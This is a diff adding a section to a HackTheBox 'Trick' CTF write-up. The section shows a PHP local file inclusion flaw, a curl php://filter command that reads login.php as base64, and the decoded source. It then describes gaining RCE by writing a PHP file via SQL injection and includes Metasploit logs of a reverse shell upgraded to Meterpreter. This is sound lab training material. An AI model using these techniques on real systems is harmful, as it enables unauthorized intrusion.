@@ -575,8 +575,213 @@ available databases [2]:
 </code></pre></div>
 
 <p>Ok, two vhosts the already known <code>preprod-payroll.trick.htb</code> and the yet unknown host <code>preprod-marketing.trick.htb</code>.
-Aaaand now we might read webserver files using the SQL injection?</p>
-<div class="highlight"><pre><span></span><code>In the very first file we read `index.php` we find a possible **File Inclusion** vulnerability.
+Aaaand now we might read webserver files using the SQL injection?
+In the very first file we read <code>index.php</code> we find a possible <strong>File Inclusion</strong> vulnerability.</p>
+<div class="highlight"><pre><span></span><code><span class="x">--------snip---------</span>
+<span class="x">  &lt;main id=&quot;view-panel&quot; &gt;</span>
+<span class="x">      </span><span class="cp">&lt;?php</span> <span class="nv">$page</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span> <span class="o">:</span><span class="s1">&#39;home&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">      </span><span class="cp">&lt;?php</span> <span class="k">include</span> <span class="nv">$page</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">  &lt;/main&gt;</span>
+<span class="x">--------snip---------</span>
+</code></pre></div>
+
+<p>Local File Inclusion is working great. We can extract data if we know the path. We extract the <code>login.php</code> file using</p>
+<div class="highlight"><pre><span></span><code>curl <span class="s1">&#39;http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=login&#39;</span> --silent <span class="p">|</span> rg --multiline --multiline-dotall <span class="s1">&#39;(&lt;main id=&quot;view-panel&quot; &gt;(.*?)&lt;/main&gt;)&#39;</span> -a
+  &lt;main <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;view-panel&quot;</span> &gt;
+                PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQoNCjxoZWFkPg0KICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+DQogIDxtZXRhIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiIG5hbWU9InZpZXdwb3J0Ij4NCg0KICA8dGl0bGU+QWRtaW4gfCBFbXBsb3llZSdzIFBheXJvbGwgTWFuYWdlbWVudCBTeXN0ZW08L3RpdGxlPg0KIAkNCg0KPD9waHAgaW5jbHVkZSgnLi9oZWFkZXIucGhwJyk7ID8+DQo8P3BocCBpbmNsdWRlKCcuL2RiX2Nvbm5lY3QucGhwJyk7ID8+DQo8P3BocCANCnNlc3Npb25fc3RhcnQoKTsNCmlmKGlzc2V0KCRfU0VTU0lPTlsnbG9naW5faWQnXSkpDQpoZWFkZXIoImxvY2F0aW9uOmluZGV4LnBocD9wYWdlPWhvbWUiKTsNCg0KPz4NCg0KPC9oZWFkPg0KPHN0eWxlPg0KCWJvZHl7DQoJCXdpZHRoOiAxMDAlOw0KCSAgICBoZWlnaHQ6IGNhbGMoMTAwJSk7DQoJICAgIC8qYmFja2dyb3VuZDogIzAwN2JmZjsqLw0KCX0NCgltYWluI21haW57DQoJCXdpZHRoOjEwMCU7DQoJCWhlaWdodDogY2FsYygxMDAlKTsNCgkJYmFja2dyb3VuZDp3aGl0ZTsNCgl9DQoJI2xvZ2luLXJpZ2h0ew0KCQlwb3NpdGlvbjogYWJzb2x1dGU7DQoJCXJpZ2h0OjA7DQoJCXdpZHRoOjQwJTsNCgkJaGVpZ2h0OiBjYWxjKDEwMCUpOw0KCQliYWNrZ3JvdW5kOndoaXRlOw0KCQlkaXNwbGF5OiBmbGV4Ow0KCQlhbGlnbi1pdGVtczogY2VudGVyOw0KCX0NCgkjbG9naW4tbGVmdHsNCgkJcG9zaXRpb246IGFic29sdXRlOw0KCQlsZWZ0OjA7DQoJCXdpZHRoOjYwJTsNCgkJaGVpZ2h0OiBjYWxjKDEwMCUpOw0KCQliYWNrZ3JvdW5kOiM1OWI2ZWM2MTsNCgkJZGlzcGxheTogZmxleDsNCgkJYWxpZ24taXRlbXM6IGNlbnRlcjsNCgkJYmFja2dyb3VuZDogdXJsKGFzc2V0cy9pbWcvcGF5cm9sbC1jb3Zlci5qcGcpOw0KCSAgICBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0Ow0KCSAgICBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOw0KCX0NCgkjbG9naW4tcmlnaHQgLmNhcmR7DQoJCW1hcmdpbjogYXV0bzsNCgkJei1pbmRleDogMQ0KCX0NCgkubG9nbyB7DQogICAgbWFyZ2luOiBhdXRvOw0KICAgIGZvbnQtc2l6ZTogOHJlbTsNCiAgICBiYWNrZ3JvdW5kOiB3aGl0ZTsNCiAgICBwYWRkaW5nOiAuNWVtIDAuN2VtOw0KICAgIGJvcmRlci1yYWRpdXM6IDUwJSA1MCU7DQogICAgY29sb3I6ICMwMDAwMDBiMzsNCiAgICB6LWluZGV4OiAxMDsNCn0NCmRpdiNsb2dpbi1yaWdodDo6YmVmb3JlIHsNCiAgICBjb250ZW50OiAiIjsNCiAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgdG9wOiAwOw0KICAgIGxlZnQ6IDA7DQogICAgd2lkdGg6IGNhbGMoMTAwJSk7DQogICAgaGVpZ2h0OiBjYWxjKDEwMCUpOw0KICAgIGJhY2tncm91bmQ6ICM5ZmEzYTdlMDsNCn0NCg0KPC9zdHlsZT4NCg0KPGJvZHk+DQoNCg0KICA8bWFpbiBpZD0ibWFpbiIgY2xhc3M9IiBiZy1kYXJrIj4NCiAgCQk8ZGl2IGlkPSJsb2dpbi1sZWZ0Ij4NCiAgCQkJDQogIAkJPC9kaXY+DQoNCiAgCQk8ZGl2IGlkPSJsb2dpbi1yaWdodCI+DQogIAkJCTxkaXYgY2xhc3M9ImNhcmQgY29sLW1kLTgiPg0KICAJCQkJPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgCQkJCQkJDQogIAkJCQkJPGZvcm0gaWQ9ImxvZ2luLWZvcm0iID4NCiAgCQkJCQkJPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+DQogIAkJCQkJCQk8bGFiZWwgZm9yPSJ1c2VybmFtZSIgY2xhc3M9ImNvbnRyb2wtbGFiZWwiPlVzZXJuYW1lPC9sYWJlbD4NCiAgCQkJCQkJCTxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0idXNlcm5hbWUiIG5hbWU9InVzZXJuYW1lIiBjbGFzcz0iZm9ybS1jb250cm9sIj4NCiAgCQkJCQkJPC9kaXY+DQogIAkJCQkJCTxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPg0KICAJCQkJCQkJPGxhYmVsIGZvcj0icGFzc3dvcmQiIGNsYXNzPSJjb250cm9sLWxhYmVsIj5QYXNzd29yZDwvbGFiZWw+DQogIAkJCQkJCQk8aW5wdXQgdHlwZT0icGFzc3dvcmQiIGlkPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiPg0KICAJCQkJCQk8L2Rpdj4NCiAgCQkJCQkJPGNlbnRlcj48YnV0dG9uIGNsYXNzPSJidG4tc20gYnRuLWJsb2NrIGJ0bi13YXZlIGNvbC1tZC00IGJ0bi1wcmltYXJ5Ij5Mb2dpbjwvYnV0dG9uPjwvY2VudGVyPg0KICAJCQkJCTwvZm9ybT4NCiAgCQkJCTwvZGl2Pg0KICAJCQk8L2Rpdj4NCiAgCQk8L2Rpdj4NCiAgIA0KDQogIDwvbWFpbj4NCg0KICA8YSBocmVmPSIjIiBjbGFzcz0iYmFjay10by10b3AiPjxpIGNsYXNzPSJpY29mb250LXNpbXBsZS11cCI+PC9pPjwvYT4NCg0KDQo8L2JvZHk+DQo8c2NyaXB0Pg0KCSQoJyNsb2dpbi1mb3JtJykuc3VibWl0KGZ1bmN0aW9uKGUpew0KCQllLnByZXZlbnREZWZhdWx0KCkNCgkJJCgnI2xvZ2luLWZvcm0gYnV0dG9uW3R5cGU9ImJ1dHRvbiJdJykuYXR0cignZGlzYWJsZWQnLHRydWUpLmh0bWwoJ0xvZ2dpbmcgaW4uLi4nKTsNCgkJaWYoJCh0aGlzKS5maW5kKCcuYWxlcnQtZGFuZ2VyJykubGVuZ3RoID4gMCApDQoJCQkkKHRoaXMpLmZpbmQoJy5hbGVydC1kYW5nZXInKS5yZW1vdmUoKTsNCgkJJC5hamF4KHsNCgkJCXVybDonYWpheC5waHA/YWN0aW9uPWxvZ2luJywNCgkJCW1ldGhvZDonUE9TVCcsDQoJCQlkYXRhOiQodGhpcykuc2VyaWFsaXplKCksDQoJCQllcnJvcjplcnI9PnsNCgkJCQljb25zb2xlLmxvZyhlcnIpDQoJCSQoJyNsb2dpbi1mb3JtIGJ1dHRvblt0eXBlPSJidXR0b24iXScpLnJlbW92ZUF0dHIoJ2Rpc2FibGVkJykuaHRtbCgnTG9naW4nKTsNCg0KCQkJfSwNCgkJCXN1Y2Nlc3M6ZnVuY3Rpb24ocmVzcCl7DQoJCQkJaWYocmVzcCA9PSAxKXsNCgkJCQkJbG9jYXRpb24uaHJlZiA9J2luZGV4LnBocD9wYWdlPWhvbWUnOw0KCQkJCX1lbHNlIGlmKHJlc3AgPT0gMil7DQoJCQkJCWxvY2F0aW9uLmhyZWYgPSd2b3RpbmcucGhwJzsNCgkJCQl9ZWxzZXsNCgkJCQkJJCgnI2xvZ2luLWZvcm0nKS5wcmVwZW5kKCc8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1kYW5nZXIiPlVzZXJuYW1lIG9yIHBhc3N3b3JkIGlzIGluY29ycmVjdC48L2Rpdj4nKQ0KCQkJCQkkKCcjbG9naW4tZm9ybSBidXR0b25bdHlwZT0iYnV0dG9uIl0nKS5yZW1vdmVBdHRyKCdkaXNhYmxlZCcpLmh0bWwoJ0xvZ2luJyk7DQoJCQkJfQ0KCQkJfQ0KCQl9KQ0KCX0pDQo8L3NjcmlwdD4JDQo8L2h0bWw+
+
+  &lt;/main&gt;
+</code></pre></div>
+
+<p>Decoded</p>
+<div class="highlight"><pre><span></span><code><span class="x">&lt;!DOCTYPE html&gt;</span>
+<span class="x">&lt;html lang=&quot;en&quot;&gt;</span>
+
+<span class="x">&lt;head&gt;</span>
+<span class="x">  &lt;meta charset=&quot;utf-8&quot;&gt;</span>
+<span class="x">  &lt;meta content=&quot;width=device-width, initial-scale=1.0&quot; name=&quot;viewport&quot;&gt;</span>
+
+<span class="x">  &lt;title&gt;Admin | Employee&#39;s Payroll Management System&lt;/title&gt;</span>
+
+
+<span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="s1">&#39;./header.php&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="s1">&#39;./db_connect.php&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="cp">&lt;?php</span> 
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login_id&#39;</span><span class="p">]))</span>
+<span class="nb">header</span><span class="p">(</span><span class="s2">&quot;location:index.php?page=home&quot;</span><span class="p">);</span>
+
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">&lt;/head&gt;</span>
+<span class="x">&lt;style&gt;</span>
+<span class="x">    body{</span>
+<span class="x">        width: 100%;</span>
+<span class="x">        height: calc(100%);</span>
+<span class="x">        /*background: #007bff;*/</span>
+<span class="x">    }</span>
+<span class="x">    main#main{</span>
+<span class="x">        width:100%;</span>
+<span class="x">        height: calc(100%);</span>
+<span class="x">        background:white;</span>
+<span class="x">    }</span>
+<span class="x">    #login-right{</span>
+<span class="x">        position: absolute;</span>
+<span class="x">        right:0;</span>
+<span class="x">        width:40%;</span>
+<span class="x">        height: calc(100%);</span>
+<span class="x">        background:white;</span>
+<span class="x">        display: flex;</span>
+<span class="x">        align-items: center;</span>
+<span class="x">    }</span>
+<span class="x">    #login-left{</span>
+<span class="x">        position: absolute;</span>
+<span class="x">        left:0;</span>
+<span class="x">        width:60%;</span>
+<span class="x">        height: calc(100%);</span>
+<span class="x">        background:#59b6ec61;</span>
+<span class="x">        display: flex;</span>
+<span class="x">        align-items: center;</span>
+<span class="x">        background: url(assets/img/payroll-cover.jpg);</span>
+<span class="x">        background-repeat: no-repeat;</span>
+<span class="x">        background-size: cover;</span>
+<span class="x">    }</span>
+<span class="x">    #login-right .card{</span>
+<span class="x">        margin: auto;</span>
+<span class="x">        z-index: 1</span>
+<span class="x">    }</span>
+<span class="x">    .logo {</span>
+<span class="x">    margin: auto;</span>
+<span class="x">    font-size: 8rem;</span>
+<span class="x">    background: white;</span>
+<span class="x">    padding: .5em 0.7em;</span>
+<span class="x">    border-radius: 50% 50%;</span>
+<span class="x">    color: #000000b3;</span>
+<span class="x">    z-index: 10;</span>
+<span class="x">}</span>
+<span class="x">div#login-right::before {</span>
+<span class="x">    content: &quot;&quot;;</span>
+<span class="x">    position: absolute;</span>
+<span class="x">    top: 0;</span>
+<span class="x">    left: 0;</span>
+<span class="x">    width: calc(100%);</span>
+<span class="x">    height: calc(100%);</span>
+<span class="x">    background: #9fa3a7e0;</span>
+<span class="x">}</span>
+
+<span class="x">&lt;/style&gt;</span>
+
+<span class="x">&lt;body&gt;</span>
+
+
+<span class="x">  &lt;main id=&quot;main&quot; class=&quot; bg-dark&quot;&gt;</span>
+<span class="x">        &lt;div id=&quot;login-left&quot;&gt;</span>
+
+<span class="x">        &lt;/div&gt;</span>
+
+<span class="x">        &lt;div id=&quot;login-right&quot;&gt;</span>
+<span class="x">            &lt;div class=&quot;card col-md-8&quot;&gt;</span>
+<span class="x">                &lt;div class=&quot;card-body&quot;&gt;</span>
+
+<span class="x">                    &lt;form id=&quot;login-form&quot; &gt;</span>
+<span class="x">                        &lt;div class=&quot;form-group&quot;&gt;</span>
+<span class="x">                            &lt;label for=&quot;username&quot; class=&quot;control-label&quot;&gt;Username&lt;/label&gt;</span>
+<span class="x">                            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; class=&quot;form-control&quot;&gt;</span>
+<span class="x">                        &lt;/div&gt;</span>
+<span class="x">                        &lt;div class=&quot;form-group&quot;&gt;</span>
+<span class="x">                            &lt;label for=&quot;password&quot; class=&quot;control-label&quot;&gt;Password&lt;/label&gt;</span>
+<span class="x">                            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot;&gt;</span>
+<span class="x">                        &lt;/div&gt;</span>
+<span class="x">                        &lt;center&gt;&lt;button class=&quot;btn-sm btn-block btn-wave col-md-4 btn-primary&quot;&gt;Login&lt;/button&gt;&lt;/center&gt;</span>
+<span class="x">                    &lt;/form&gt;</span>
+<span class="x">                &lt;/div&gt;</span>
+<span class="x">            &lt;/div&gt;</span>
+<span class="x">        &lt;/div&gt;</span>
+
+
+<span class="x">  &lt;/main&gt;</span>
+
+<span class="x">  &lt;a href=&quot;#&quot; class=&quot;back-to-top&quot;&gt;&lt;i class=&quot;icofont-simple-up&quot;&gt;&lt;/i&gt;&lt;/a&gt;</span>
+
+
+<span class="x">&lt;/body&gt;</span>
+<span class="x">&lt;script&gt;</span>
+<span class="x">    $(&#39;#login-form&#39;).submit(function(e){</span>
+<span class="x">        e.preventDefault()</span>
+<span class="x">        $(&#39;#login-form button[type=&quot;button&quot;]&#39;).attr(&#39;disabled&#39;,true).html(&#39;Logging in...&#39;);</span>
+<span class="x">        if($(this).find(&#39;.alert-danger&#39;).length &gt; 0 )</span>
+<span class="x">            $(this).find(&#39;.alert-danger&#39;).remove();</span>
+<span class="x">        $.ajax({</span>
+<span class="x">            url:&#39;ajax.php?action=login&#39;,</span>
+<span class="x">            method:&#39;POST&#39;,</span>
+<span class="x">            data:$(this).serialize(),</span>
+<span class="x">            error:err=&gt;{</span>
+<span class="x">                console.log(err)</span>
+<span class="x">        $(&#39;#login-form button[type=&quot;button&quot;]&#39;).removeAttr(&#39;disabled&#39;).html(&#39;Login&#39;);</span>
+
+<span class="x">            },</span>
+<span class="x">            success:function(resp){</span>
+<span class="x">                if(resp == 1){</span>
+<span class="x">                    location.href =&#39;index.php?page=home&#39;;</span>
+<span class="x">                }else if(resp == 2){</span>
+<span class="x">                    location.href =&#39;voting.php&#39;;</span>
+<span class="x">                }else{</span>
+<span class="x">                    $(&#39;#login-form&#39;).prepend(&#39;&lt;div class=&quot;alert alert-danger&quot;&gt;Username or password is incorrect.&lt;/div&gt;&#39;)</span>
+<span class="x">                    $(&#39;#login-form button[type=&quot;button&quot;]&#39;).removeAttr(&#39;disabled&#39;).html(&#39;Login&#39;);</span>
+<span class="x">                }</span>
+<span class="x">            }</span>
+<span class="x">        })</span>
+<span class="x">    })</span>
+<span class="x">&lt;/script&gt;   </span>
+<span class="x">&lt;/html&gt;</span>
+</code></pre></div>
+
+<p>Ok, we can read files using SQL injection and we can read files using Local File inclusion, but maybe we can gain RCE using the PHP File Inclusion. We use the SQL injection to write a simple PHP file to <code>/tmp/</code> and then include it using the LFI.</p>
+<div class="highlight"><pre><span></span><code>msf6 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.8:4444
+[*] Command shell session 2 opened (10.10.14.8:4444 -&gt; 10.10.11.166:42224) at 2022-06-26 08:27:25 +0200
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+^Z
+Background session 2? [y/N]  y
+msf6 exploit(multi/handler) &gt; search shell_to
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
+
+msf6 exploit(multi/handler) &gt; use 0
+msf6 post(multi/manage/shell_to_meterpreter) &gt; show options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on
+
+msf6 post(multi/manage/shell_to_meterpreter) &gt; set SESSION 2
+SESSION =&gt; 2
+msf6 post(multi/manage/shell_to_meterpreter) &gt; run
+
+[*] Upgrading session ID: 2
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.10.14.8:4433
+[*] Sending stage (989032 bytes) to 10.10.11.166
+[*] Meterpreter session 3 opened (10.10.14.8:4433 -&gt; 10.10.11.166:44914) at 2022-06-26 08:28:03 +0200
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+msf6 post(multi/manage/shell_to_meterpreter) &gt;
 </code></pre></div>
 
 <hr>
